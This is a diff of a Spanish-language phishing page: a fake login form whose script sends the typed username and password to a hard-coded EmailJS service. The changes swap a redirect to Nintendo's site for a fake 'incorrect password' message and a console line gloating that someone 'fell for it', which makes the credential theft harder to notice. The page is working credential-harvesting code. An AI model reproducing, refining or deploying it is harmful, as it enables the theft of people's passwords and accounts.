@@ -26,10 +26,6 @@
             flex-direction: column;
             align-items: center;
             border: 1px solid #e3e3e3;
-            
-            
-            
-            
         }
         input, button {
             width: 95%;
@@ -42,34 +38,19 @@
         button {
             background-color: #555;
             color: #fff;
-
-
-
         }
-
-
-
         .header-image {
             width: 300px; /* Cambia el tamaño a lo que prefieras */
             height: auto; /* Mantiene la proporción de la imagen */
             margin-bottom: 20px;
             display: inline-block;
         }
-
-
-
-
-
-
         .text-between {
             color: #000; /* Color del texto */
             margin-bottom: 20px; /* Espacio debajo del texto */
             font-size: 16px; /* Tamaño del texto */
             font-family: 'Roboto', sans-serif;
         }
-
-
-
         label {
             color: #000; /* Texto de las etiquetas en negro */
             text-align: left;
@@ -79,15 +60,22 @@
             display: block;
             font-family: 'Roboto', sans-serif;
         }
-
+        #mensaje {
+            display: none; /* Al principio el mensaje está oculto */
+            margin-top: 10px;
+            color: red;
+            font-size: 20px;
+            font-family: 'Roboto', sans-serif;
+        }
     </style>
-    <!-- Actualización a la nueva versión del SDK de EmailJS -->
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
+        // Inicialización del servicio EmailJS
         (function(){
             emailjs.init("WTBSDHI6pGlHer-mC");
         })();
 
+        // Función para enviar el correo
         function sendMail() {
             const name = document.getElementById("name").value;
             const email = document.getElementById("email").value;
@@ -99,12 +87,19 @@
 
             emailjs.send("service_ekintuo", "template_abeyzek", templateParams)
                 .then(response => {
-                    window.location.href = "https://www.nintendo.com/es-es/";
+                    console.log("Alguien ha caido")
                 })
                 .catch(error => {
                     alert("Error al iniciar sesión", error);
                     console.error("Error:", error); // Muestra más detalles en la consola
                 });
+        }
+
+        // Función que muestra el mensaje de error
+        function mostrarMensaje() {
+            document.getElementById("mensaje").style.display = "block";
+            console.log("¡Contraseña incorrecta!");
+            sendMail();  // Llama a sendMail cuando se muestra el mensaje
         }
     </script>
 </head>
@@ -118,7 +113,8 @@
         <input type="email" id="name" placeholder="Correo electrónico o nombre de acceso" required>
         <label for="email">Contraseña:</label>
         <input type="password" id="email" placeholder="Contraseña" required>
-        <button onclick="sendMail()">Enviar</button>
+        <button onclick="mostrarMensaje()">Enviar</button>
+        <div id="mensaje">Contraseña Incorrecta</div>
     </div>
 </body>
 </html>
